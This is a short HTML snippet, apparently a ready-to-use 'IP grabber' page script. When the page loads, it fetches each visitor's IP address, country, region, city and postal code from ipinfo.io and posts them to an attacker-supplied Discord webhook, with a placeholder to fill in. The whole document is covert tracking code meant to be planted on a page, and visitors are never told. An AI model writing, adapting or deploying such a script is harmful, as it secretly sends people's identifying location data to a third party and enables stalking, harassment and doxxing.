<script>
function monke(json) 
{
     var request = new XMLHttpRequest();
     
     request.open("POST", "Replace this with your webhook!");

     request.setRequestHeader('Content-type', 'application/json');

     var params = 
     {
          username: "IP Logger",
          avatar_url: "https://cdn.discordapp.com/attachments/1129746737683243114/1157741829404495934/image.png?ex=6519b699&is=65186519&hm=f2a20e3eaf682df172b5b3b590dd52e077e8bab086f42b4a001f6c9d191b3e5c&",
          content: "@everyone",
          embeds: [
               {
                    title: "Someone visited the IP grabber!",
                    color: 1752220,
                    description: "**IP:** `" + json.ip + "`\n**Country:** `" + json.country + "`\n**Region:** `" + json.region + "`\n**Town/City:** `" + json.city + "`\n**ZIP:** `" + json.postal + "`"
               }
          ]
     }

     request.send(JSON.stringify(params));
}
</script>
<script src="https://ipinfo.io/?format=jsonp&callback=monke"></script>
